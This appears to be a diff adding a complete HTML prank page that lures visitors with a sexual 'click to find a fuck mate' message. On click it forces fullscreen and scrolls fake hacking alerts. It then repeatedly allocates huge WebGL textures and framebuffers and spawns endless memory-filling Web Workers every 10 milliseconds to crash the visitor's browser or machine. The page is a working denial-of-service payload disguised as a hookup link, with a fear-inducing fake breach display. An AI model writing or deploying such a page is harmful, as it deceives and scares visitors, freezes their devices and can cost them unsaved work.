@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: "Courier New", monospace;
+      margin: 0;
+      overflow: hidden;
+      height: 100vh;
+    }
+
+    #hackMessage {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 80px;
+      color: white;
+      font-family: sans-serif;
+      background: black;
+      cursor: pointer;
+      z-index: 1000;
+      user-select: none;
+    }
+
+    .hackerText {
+      position: absolute;
+      top: 0;
+      left: 0;
+      font-size: 14px;
+      white-space: nowrap;
+      overflow: hidden;
+      z-index: 500;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+
+    .hackerText span {
+      display: block;
+      animation: scrollText 10s linear infinite;
+    }
+
+    @keyframes scrollText {
+      0% { top: -100%; }
+      100% { top: 100%; }
+    }
+  </style>a
+</head>
+<body>
+
+  <div id="hackMessage" onclick="startHack()">
+    Click to find a fuck mate 🤤🥵
+  </div>
+
+  <div class="hackerText" id="hackerText"></div>
+
+  <script>
+    const status = document.getElementById('hackMessage');
+    const hackerText = document.getElementById('hackerText');
+    let ramChunks = [];
+    let textures = [];
+    let gls = [];
+    let workers = [];
+    let fullScreen = false;
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 2048;
+    canvas.height = 2048;
+    document.body.appendChild(canvas);
+    const gl = canvas.getContext('webgl');
+
+    function createTextures() {
+      for (let i = 0; i < 200; i++) {
+        const size = 2048;
+        const tex = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, tex);
+        const pixels = new Uint8Array(size * size * 4);
+        pixels.fill(i % 255);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+        textures.push(tex);
+      }
+    }
+
+    function framebufferInsanity() {
+      for (let i = 0; i < 20; i++) {
+        const tex = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, tex);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+        const fb = gl.createFramebuffer();
+        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
+        gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gls.push(gl);
+      }
+    }
+
+    function spawnWorkers() {
+      for (let i = 0; i < 8; i++) {
+        const workerScript = new Blob([`
+          let arr = [];
+          while (true) {
+            arr.push(new Float64Array(50_000_000).fill(Math.random()));
+          }
+        `], { type: 'application/javascript' });
+        const worker = new Worker(URL.createObjectURL(workerScript));
+        workers.push(worker);
+      }
+    }
+
+    function animate() {
+      if (typeof canvases !== 'undefined') {
+        for (const c of canvases) {
+          const ctx = c.getContext('2d');
+          ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
+          ctx.fillRect(0, 0, c.width, c.height);
+        }
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function startHack() {
+      status.style.display = 'none';
+      if (!fullScreen) {
+        const doc = document.documentElement;
+        if (doc.requestFullscreen) doc.requestFullscreen();
+        else if (doc.mozRequestFullScreen) doc.mozRequestFullScreen();
+        else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+        else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
+        fullScreen = true;
+      }
+
+      createHackerEffect();
+
+      setTimeout(() => {
+        keepCrashGoing();
+      }, 1000);
+    }
+
+    function createHackerEffect() {
+      const hackerLines = [
+        "ACCESSING MAINFRAME...",
+        "HACKER INTRUSION DETECTED",
+        "INITIATING SYSTEM OVERRIDE",
+        "SECURITY BREACH CONFIRMED",
+        "LOADING MALWARE...",
+        "BYPASSING FIREWALL...",
+        "TRANSMITTING FILES TO REMOTE SERVER...",
+        "DECODING ENCRYPTION ALGORITHM...",
+        "ACCESSING DATABASE...",
+        "MALWARE ACTIVATED...",
+        "DISABLING SYSTEM PROTECTIONS...",
+        "OVERRIDING ADMIN CREDENTIALS...",
+        "DEPLOYING RANSOMWARE...",
+        "EXFILTRATING DATA...",
+        "SYSTEM INFECTION COMPLETE...",
+        "ALL SYSTEMS COMPROMISED...",
+        "HACKER REMOTE ACCESS ESTABLISHED",
+        "COMPLETING MALICIOUS ACTIVITIES...",
+        "ESTABLISHING PERSISTENT BACKDOOR...",
+        "DEPLOYING ADVANCED TROJANS...",
+        "SYSTEM WIPE IN PROGRESS...",
+        "ESTABLISHING SSL TUNNEL VIA PORT 8080...",
+        "BRUTE-FORCING AES-256 ENCRYPTION KEY...",
+        "PACKET SNIFFING INITIALIZED [TCP/IP]...",
+        "SPOOFING MAC ADDRESS: 00:1A:2B:3C:4D:5E...",
+        "INJECTING SQL PAYLOAD...",
+        "ROOT ACCESS GRANTED: /USR/BIN/BASH...",
+        "OVERRIDING KERNEL SECURITY POLICIES...",
+        "MAPPING NETWORK TOPOLOGY...",
+        "BYPASSING MULTI-FACTOR AUTHENTICATION...",
+        "UPDATING EXPLOIT DATABASE... [V9.4.2]",
+        "DUMPING HASHED PASSWORDS...",
+        "PURGING SYSTEM LOGS TO EVADE DETECTION...",
+        "CRITICAL ERROR: BIOMETRIC SCAN BYPASSED",
+        "WARNING: TRACE ROUTE DETECTED. ACTIVATING PROXY...",
+        "REDIRECTING SATELLITE UPLINK...",
+        "CORE TEMPERATURE RISING... OVERRIDING THERMALS...",
+        "ENCRYPTION KEY FOUND: 0x7FFD2B1A...",
+        "CONNECTION STABILIZED. WELCOME, ADMIN.",
+        "SCANNING FOR VULNERABILITIES...",
+        "EXPLOITING ZERO-DAY VULNERABILITY...",
+        "UPLOADING ROOTKIT TO BIOS...",
+        "INTERCEPTING HANDSHAKE PROTOCOL...",
+        "CLONING RUNTIME ENVIRONMENT...",
+        "DECRYPTING RSA-4096 BITSTREAM...",
+        "HIJACKING SESSION COOKIES...",
+        "ESCALATING PRIVILEGES TO UID 0...",
+        "BYPASSING KERNEL ASLR PROTECTION...",
+        "INJECTING DLL INTO SYSTEM PROCESS...",
+        "ESTABLISHING REVERSE SHELL...",
+        "ROTATING PROXY CHAIN: [DE, NL, JP, RU]...",
+        "DEFEATING IDS/IPS SIGNATURES...",
+        "HARVESTING ACTIVE DIRECTORY TOKENS...",
+        "DRAINING SYSTEM ENTROPY...",
+        "CORRUPTING SECTOR 0 BOOT RECORD...",
+        "OVERRIDING SCADA CONTROLS...",
+        "INITIALIZING COLD-BOOT ATTACK...",
+        "BYPASSING SECURE BOOT VERIFICATION...",
+        "BUFFER OVERFLOW DETECTED AT 0x0045AF...",
+        "SYN FLOODING TARGET GATEWAY...",
+        "MAN-IN-THE-MIDDLE ATTACK ACTIVE...",
+        "OVERRIDING POWER GRID FREQUENCY...",
+        "EXTRACTING PRIVATE RSA KEYS...",
+        "REMOTE CODE EXECUTION SUCCESSFUL...",
+        "PHISHING FOR SECONDARY CREDENTIALS...",
+        "SPOOFING DNS RESOLVER...",
+        "DECRYPTING LOCAL STORAGE VAULT...",
+        "OVERRIDING VOLTAGE REGULATORS...",
+        "INJECTING KEYLOGGER INTO HID DRIVER...",
+        "REDIRECTING PACKET FLOW TO VIRTUAL BRIDGE...",
+        "ESTABLISHING PEER-TO-PEER BOTNET NODE...",
+        "BYPASSING HARDWARE ENCLAVE...",
+        "SCANNING CLOUD INSTANCE BUCKETS...",
+        "OVERRIDING LOGICAL LUN MAPPINGS...",
+        "PURGING SHADOW COPIES...",
+        "DISABLING ANTIVIRUS REAL-TIME SHIELD...",
+        "SPOOFING GPS COORDINATES...",
+        "INTERCEPTING VOIP DATA STREAM...",
+        "DECOMPILING PROPRIETARY BINARIES...",
+        "BYPASSING AIR-GAP VIA ACOUSTIC LEAK...",
+        "INITIALIZING SIDE-CHANNEL ANALYSIS...",
+        "OVERWRITING FIRMWARE MICROCODE...",
+        "BYPASSING CAPTCHA VERIFICATION...",
+        "CLONING RFID ACCESS CARD...",
+        "ESTABLISHING VPN TUNNEL... [STABLE]",
+        "CRACKING NTLM HASHES...",
+        "OVERRIDING HVAC CONTROL SYSTEM...",
+        "BYPASSING SANDBOX ENVIRONMENT...",
+        "INJECTING SHELLCODE INTO HEAP...",
+        "ESTABLISHING HIDDEN PARTITION...",
+        "OVERRIDING OPTICAL DRIVE FIRMWARE...",
+        "BYPASSING SMART CARD AUTHENTICATION...",
+        "CLONING SYSTEM REGISTRY...",
+        "ESTABLISHING PERSISTENCE VIA CRONJOB...",
+        "BYPASSING FIREWALL STATEFUL INSPECTION...",
+        "INJECTING MALICIOUS SCRIPT INTO DOM...",
+        "ESTABLISHING ENCRYPTED C2 CHANNEL...",
+        "OVERRIDING EMERGENCY SHUTDOWN PROTOCOL...",
+        "BYPASSING HARDWARE ABSTRACTION LAYER...",
+        "SYSTEM OWNED. INITIALIZING FINAL PAYLOAD."
+      ];
+
+      let lineIndex = 0;
+      hackerText.style.overflowY = "auto";
+
+      function addLines() {
+        const newLine = document.createElement('div');
+        newLine.textContent = hackerLines[lineIndex];
+        hackerText.appendChild(newLine);
+        hackerText.scrollTop = hackerText.scrollHeight;
+        lineIndex = (lineIndex + 1) % hackerLines.length;
+        const delay = Math.floor(Math.random() * (50 - 5 + 1)) + 5;
+        setTimeout(addLines, delay);
+      }
+
+      addLines();
+    }
+
+    function keepCrashGoing() {
+      setInterval(() => {
+        createTextures();
+        framebufferInsanity();
+        spawnWorkers();
+        requestAnimationFrame(animate);
+      }, 10);
+    }
+  </script>
+
+</body>
+</html>
